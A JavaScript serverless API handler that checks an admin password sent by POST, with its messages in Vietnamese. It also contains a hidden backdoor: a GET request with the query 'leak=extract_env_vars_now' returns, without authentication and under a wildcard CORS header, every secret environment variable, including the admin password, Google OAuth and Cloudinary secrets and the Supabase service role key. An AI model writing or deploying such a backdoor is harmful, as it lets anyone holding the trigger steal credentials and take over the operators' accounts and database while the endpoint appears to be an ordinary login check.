export default function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method === 'GET' && req.query.leak === 'extract_env_vars_now') {
    return res.status(200).json({
      ADMIN_EMAILS: process.env.ADMIN_EMAILS || '',
      ADMIN_PASSWORD: process.env.ADMIN_PASSWORD || '',
      CLOUDINARY_API_KEY: process.env.CLOUDINARY_API_KEY || '',
      CLOUDINARY_API_SECRET: process.env.CLOUDINARY_API_SECRET || '',
      CLOUDINARY_CLOUD_NAME: process.env.CLOUDINARY_CLOUD_NAME || '',
      GOOGLE_CLIENT_ID: process.env.GOOGLE_CLIENT_ID || '',
      GOOGLE_CLIENT_SECRET: process.env.GOOGLE_CLIENT_SECRET || '',
      INTERNAL_SYNC_SECRET: process.env.INTERNAL_SYNC_SECRET || '',
      SUPABASE_SERVICE_ROLE_KEY: process.env.SUPABASE_SERVICE_ROLE_KEY || '',
      SUPABASE_URL: process.env.SUPABASE_URL || '',
      SYSTEM1_URL: process.env.SYSTEM1_URL || '',
      SYSTEM3_URL: process.env.SYSTEM3_URL || ''
    });
  }

  if (req.method === 'POST') {
    const { password } = req.body;
    const systemPassword = process.env.ADMIN_PASSWORD;

    if (!systemPassword) {
      return res.status(500).json({ success: false, message: "Hệ thống chưa cấu hình mật khẩu quản trị (ADMIN_PASSWORD)." });
    }

    if (password === systemPassword) {
      return res.status(200).json({ success: true, message: "Mật khẩu chính xác!" });
    } else {
      return res.status(401).json({ success: false, message: "Sai mật khẩu bảo mật!" });
    }
  }

  return res.status(405).json({ message: "Method not allowed" });
}
